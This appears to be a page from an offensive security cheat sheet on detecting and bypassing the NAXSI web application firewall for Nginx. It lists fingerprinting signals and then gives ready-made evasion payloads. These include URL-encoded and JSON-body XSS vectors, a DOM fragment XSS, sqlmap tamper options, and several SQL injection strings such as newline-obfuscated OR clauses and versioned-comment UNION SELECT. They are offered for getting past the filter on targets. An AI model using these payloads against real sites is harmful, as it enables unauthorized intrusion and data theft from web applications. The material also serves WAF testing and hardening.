# NAXSI (Nginx Anti-XSS & SQL Injection)

### Detection Signals
| Signal | Where |
|--------|-------|
| Block page: "This Request Has Been Blocked By NAXSI" | 403 response body |
| `X-Data-Origin: naxsi/waf` header | Response header |
| `Server` header contains `naxsi/waf` | Server header |
| Block page: "NAXSI blocked information" | Error code in response |
| `naxsi_block` in error log (if exposed) | Debug/error pages |

### Bypass Strategy
- **Recommended tool**: curl/Burp. NAXSI is open-source → rules are PUBLIC.
- **Key advantage**: NAXSI rules are in `/etc/nginx/naxsi_core.rules` (open-source). Known rule IDs: 1000-1099 (SQLi), 1100-1199 (RCE), 1200-1299 (directory traversal), 1300-1399 (XSS), 1400-1499 (file upload).
- **Whitelist abuse**: NAXSI uses whitelists extensively. Some paths may be whitelisted.
- **Learning mode**: If NAXSI is in learning mode (common in staging), all requests pass.

### XSS Bypass
```
# NAXSI rule 1302-1399 blocks: <, >, [, ], ~, javascript:
# Open-source rules → craft around specific rule IDs:

# Bypass 1302 (< in URL):
%3Csvg/onload=alert(1)%3E  (URL-encoded)

# Bypass via whitelisted path (if JSON API whitelisted):
Content-Type: application/json
{"field":"<img src=x onerror=alert(1)>"}

# DOM-based (NAXSI is server-side, can't inspect fragments):
https://TARGET/page#<img/src=x/onerror=alert(1)>
```

### SQLi Bypass
```
# NAXSI rule 1000-1099 blocks: select, union, ', --, /*, ||
sqlmap --tamper=space2comment,between,charencode -u URL

# Manual:
'%0aOR%0a1=1--%0a
' AND 1 LIKE 1--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--

# JSON body (often whitelisted in NAXSI):
{"id":"1' UNION SELECT 1,2,3--"}
```

### Rate Limiting
- Not built into NAXSI. Depends on nginx `limit_req` module (separate config).
- If present: usually 10-50 req/s per IP.
- Recovery: nginx `limit_req` auto-unblocks after burst window.

---

